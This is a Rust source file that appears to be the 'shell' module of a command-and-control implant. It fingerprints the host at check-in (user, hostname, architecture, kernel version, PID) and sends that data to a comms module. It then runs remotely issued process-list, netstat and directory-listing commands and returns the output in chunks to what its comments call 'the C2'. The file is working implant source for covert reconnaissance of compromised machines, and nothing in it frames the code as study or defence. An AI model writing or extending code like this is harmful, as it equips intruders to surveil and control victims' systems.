use super::ls::DirWalker;
use super::netstat::Netstat;
use super::tasklist::Tasklist;
use crate::bus::{BusMessage, Module, ModuleIdentity};
use crate::quic::MAXIMUM_DATA_SIZE;
use crate::sozo_debug;
use std::fs;
use tokio::sync::Mutex;
use tokio::sync::mpsc::{Receiver, Sender};
use tokio_util::sync::CancellationToken;

#[repr(u8)]
#[derive(Copy, Clone, Debug)]
pub enum ShellError {
    /* Generic Errors */
    Success,
    Critical,
    UnableToOpenDir,
    UnableToOpenFile,

    /* Directory Listing Errors */
    PermissionDenied,
    InvalidArguments,
    PathNotFound,

    /* Fallback */
    Unknown,
}

#[repr(u8)]
enum ShellOpcodes {
    Tasklist,
    Netstat,
    List,
}

impl TryFrom<u8> for ShellOpcodes {
    type Error = ();

    fn try_from(value: u8) -> Result<Self, Self::Error> {
        match value {
            0 => Ok(ShellOpcodes::Tasklist),
            1 => Ok(ShellOpcodes::Netstat),
            2 => Ok(ShellOpcodes::List),
            _ => Err(()),
        }
    }
}

pub struct Shell {
    identity: ModuleIdentity,
    tx: Sender<BusMessage>,
    rx: Mutex<Receiver<BusMessage>>,
    tasklist: Tasklist,
}

impl Shell {
    pub fn new() -> Option<Shell> {
        const MAX_MSG_BUFFER: usize = 1024;
        let (tx, rx) = tokio::sync::mpsc::channel::<BusMessage>(MAX_MSG_BUFFER);

        Some(Shell {
            identity: ModuleIdentity::SHELL,
            tx,
            rx: Mutex::new(rx),
            tasklist: Tasklist::new()?,
        })
    }

    async fn perform_checkin(&self, bus: &Sender<BusMessage>) -> Result<(), ()> {
        let user = std::env::var("USER").unwrap_or_default();
        let hostname = fs::read_to_string("/proc/sys/kernel/hostname").unwrap_or_default();
        let arch = fs::read_to_string("/proc/sys/kernel/arch").unwrap_or_default();
        let version = fs::read_to_string("/proc/sys/kernel/osrelease").unwrap_or_default();
        let pid = std::process::id();

        /* Calculate total length required for check-in structure */
        let total_length =
            user.len() + hostname.len() + arch.len() + version.len() + (size_of::<u32>() * 3);

        let mut buffer: Vec<u8> = Vec::new();
        if buffer.try_reserve(total_length).is_err() {
            return Err(());
        }

        buffer.extend_from_slice(&(total_length as u32).to_be_bytes());
        buffer.extend_from_slice(&(user.len() as u8).to_be_bytes());
        buffer.extend_from_slice(user.as_bytes());
        buffer.extend_from_slice(&(hostname.len() as u8).to_be_bytes());
        buffer.extend_from_slice(hostname.as_bytes());
        buffer.extend_from_slice(&(arch.len() as u8).to_be_bytes());
        buffer.extend_from_slice(arch.as_bytes());
        buffer.extend_from_slice(&(version.len() as u8).to_be_bytes());
        buffer.extend_from_slice(version.as_bytes());
        buffer.extend_from_slice(&(pid).to_be_bytes());

        let msg = BusMessage {
            identity: ModuleIdentity::COMMS,
            remote: Some(ModuleIdentity::SHELL),
            msg: buffer,
        };

        bus.send(msg).await.map_err(|_| ())
    }

    async fn send_response(
        &self,
        bus: &Sender<BusMessage>,
        retcode: ShellError,
        response: Option<Vec<u8>>,
    ) -> Result<(), ()> {
        /*
        * total size   : u64
        * retcode      : u8
        * chunk counter: u16
        * total chunks : u16
        * data len     : u32

        */
        const INIT_RESPONSE_HDR_LEN: u32 = 17;

        /*
         * chunk counter: u16
         * total chunks : u16
         * data len     : u32
         */
        const CONT_RESPONSE_HDR_LEN: u32 = 8;

        /* extract any data, if applicable and determine total number of chunks that will be sent */
        let data = response.unwrap_or_default();

        let total_chunks: u16 = if data.len()
            <= (MAXIMUM_DATA_SIZE - INIT_RESPONSE_HDR_LEN) as usize
        {
            1
        } else {
            let remaining = data.len() - (MAXIMUM_DATA_SIZE - INIT_RESPONSE_HDR_LEN) as usize;
            (1 + remaining.div_ceil((MAXIMUM_DATA_SIZE - CONT_RESPONSE_HDR_LEN) as usize)) as u16
        };

        let mut offset = 0;
        for chunk_index in 0..total_chunks {
            let chunk_len = if 0 == chunk_index {
                MAXIMUM_DATA_SIZE - INIT_RESPONSE_HDR_LEN
            } else {
                MAXIMUM_DATA_SIZE - CONT_RESPONSE_HDR_LEN
            };

            let end = (offset + chunk_len as usize).min(data.len());
            let chunk = &data[offset..end];
            offset = end;

            let mut chunk_msg: Vec<u8> = Vec::new();

            if 0 == chunk_index {
                if chunk_msg
                    .try_reserve(INIT_RESPONSE_HDR_LEN as usize + chunk.len())
                    .is_err()
                {
                    return Err(());
                }

                /*
                 * total size is the actual response data len excluding any packaged headers
                 * chunks are used in conjunction as a separate tracking mechanism by the C2 for data validation
                 */
                chunk_msg.extend_from_slice(&(data.len() as u64).to_be_bytes());
                chunk_msg.extend_from_slice(&(retcode as u8).to_be_bytes());
            } else {
                if chunk_msg
                    .try_reserve(CONT_RESPONSE_HDR_LEN as usize + chunk.len())
                    .is_err()
                {
                    return Err(());
                }
            }

            chunk_msg.extend_from_slice(&chunk_index.to_be_bytes());
            chunk_msg.extend_from_slice(&total_chunks.to_be_bytes());
            chunk_msg.extend_from_slice(&(chunk.len() as u32).to_be_bytes());
            chunk_msg.extend_from_slice(chunk);

            println!(
                "Sending {} bytes out of {} as chunk {} out of total chuncks {}",
                chunk_msg.len(),
                data.len(),
                chunk_index,
                total_chunks
            );

            if bus
                .send(BusMessage {
                    identity: ModuleIdentity::COMMS,
                    remote: Some(ModuleIdentity::SHELL),
                    msg: chunk_msg,
                })
                .await
                .is_err()
            {
                return Err(());
            }
        }
        Ok(())
    }
}

#[async_trait::async_trait]
impl Module for Shell {
    fn get_identity(&self) -> ModuleIdentity {
        self.identity
    }
    async fn run(&self, bus_channel: Sender<BusMessage>, token: CancellationToken) {
        if self.perform_checkin(&bus_channel).await.is_err() {
            token.cancel();
            return;
        }

        let mut rx = self.rx.lock().await;

        loop {
            tokio::select! {
                _ = token.cancelled() => break,
                msg = rx.recv() => {
                    if let Some(msg) = msg {
                        if msg.msg.is_empty() {
                            break;
                        }

                        let opcode = match ShellOpcodes::try_from(msg.msg[0]) {
                            Ok(op) => op,
                            Err(_) => break,
                        };

                        let result = match opcode {
                            ShellOpcodes::Tasklist => self.tasklist.get_snapshot(),
                            ShellOpcodes::Netstat => {
                                let mut netstat = Netstat::new();
                                netstat.get_connections()
                            },
                            ShellOpcodes::List => {
                                let mut args = Vec::new();
                                if args.try_reserve(msg.msg.len() - size_of::<u8>()).is_err() {
                                    break;
                                }

                                args.extend_from_slice(&msg.msg[size_of::<u8>()..]);
                                DirWalker::get_listing(args)
                            }
                        };

                        match result {
                            Ok(data) => {
                                if self.send_response(&bus_channel, ShellError::Success, Some(data)).await.is_err() {
                                    break;
                                }
                            }
                            Err(err) => {
                                if self.send_response(&bus_channel, err, None).await.is_err() {
                                    break;
                                }
                            }
                        }
                    } else {
                        break;
                    }
                }
            }
        }
        token.cancel();
    }
    fn enqueue(&self, msg: BusMessage) -> bool {
        self.tx.try_send(msg).is_ok()
    }
}

// todo: need to check the error type and if it was critical, etc -- this needs to occur prior to send so we can bail if required.
// todo: currently enumerating passwd_db in each module -- reduce to a single utility
// todo: add all sozo debug statements to modules
